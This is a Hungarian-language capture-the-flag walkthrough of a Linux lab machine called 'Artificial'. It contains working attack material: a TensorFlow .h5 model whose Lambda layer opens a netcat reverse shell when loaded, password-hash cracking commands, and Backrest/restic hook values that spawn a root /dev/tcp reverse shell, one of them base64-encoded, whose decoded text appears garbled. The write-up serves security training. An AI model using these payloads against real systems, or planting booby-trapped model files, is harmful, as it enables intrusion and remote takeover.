**Platform:** Linux\
**IP:** 10.10.11.74\
**Difficulty:** Easy\
**Author:** NoSec

---

## Recon

```bash
nmap -sC -sV -T4 10.10.11.74
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 14:07 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
```

**/etc/hosts szerkesztés:**

```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

---

## Web Enum

A weboldal login + regisztrációs lehetőséget ad. Sikeres regisztráció után .h5 fájlokat lehet feltölteni.

### Malicious TensorFlow modell generálása (tenserflow-cpu==2.13.1 a követelmény)

```python
# model_gen.py
import tensorflow as tf
import os

def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.44 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("nosechere.h5")
```

**Docker parancs:**

```bash
sudo docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 model_gen.py
```

Feltöltés után:

```bash
nc -lvnp 4444
```

---

## SQLite Database Enum

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite3" \) 2>/dev/null
```

Megvan: `/home/app/app/instance/users.db`

```bash
sqlite3 /home/app/app/instance/users.db
.tables
.schema user
SELECT * FROM user;
```

### Hash crack (raw-md5):

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Talált jelszavak:

```
mattp005
marwinn
```

---

## PrivEsc (Backup leak)

A `redteam-launcher` segíségével átnézve a backupokat(https://github.com/No4Sec/redteam-launcher):

```
/var/backups/backrest_backup.tar.gz
```

**Letöltés HTTP szerveren keresztül:**

```bash
cd /var/backups
python3 -m http.server
```

**Kalin:**

```bash
wget http://10.129.70.3:8000/backrest_backup.tar.gz
```

**Kitömörítés:**

```bash
tar -xvf backrest_backup.tar.gz
```

**config.json:**

```json
{
  "auth": {
    "users": [
      {
        "name": "backrest",
        "passwordBcrypt": "$2a$10$..."
      }
    ]
  }
}
```

Base64 decode után:

```bash
cat hash.txt | base64 -d
```

John bcrypt:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

---

## 🚪 Local RESTIC Web UI (port 9898)

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

Feltérépezés után megtalálható a Backrest login felület.

A korábban dumpolt jelszóval belépés után új repo-t adunk hozzá.

**Env variable exploit:**

```bash
RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
```

**Fontos:** a `Hook` mezőbe ezt állítsuk be:

```bash
RESTIC_PASSWORD_COMMAND=echo 'YmFzaCAtaSAmJiAvZGVyL3RjcC8xMC4xNi4xMzUvNDQ0NCAwPiYxCg==' | base64 -d | bash
```

**Flag:** `ON_ERROR_IGNORE`

**Miért base64?** A mező nem kezeli rendesen az értelemmel rendelkezo parancsokat, ezért jobb base64-ben beküldeni, majd `-d | bash` dekódolja.

```bash
echo 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1' | base64
```

Majd submit, és shell vissza root joggal:

```bash
nc -lvnp 4444
```

```bash
(root㉿NoSec)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 50526
bash: cannot set terminal process group (28638): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/# cd root
cd root
root@artificial:~# ls
ls
root.txt
scripts
root@artificial:~# 
```

---


## Összegzés

Az Artificial egy könnyű, mégis kreatív kihívás, ami több különböző vektort is összefűz:
- Gépi tanulási modellből indított reverse shell
- SQLite adatbázis feltárása és hash törés
- Backup fájlból kiszedett bcrypt jelszó
- RESTIC környezeti változón keresztüli RCE, ami végül root shellhez vezet

Külön érdekesség volt a `.h5` fájl alapú Tensorflow modellben elrejtett shellkód, valamint a RESTIC hook exploit, ami egy igazi hidden gem.

**Tanulság:**
- Soha ne bízz meg a feltöltött fájlokban
- Ne futtass backup szolgáltatást rootként ha nem muszáj
- És mindig nézd át a `.tar.gz` fájlokat – lehet benne meglepetés :)

---

## Root megvan. On to the next one. //

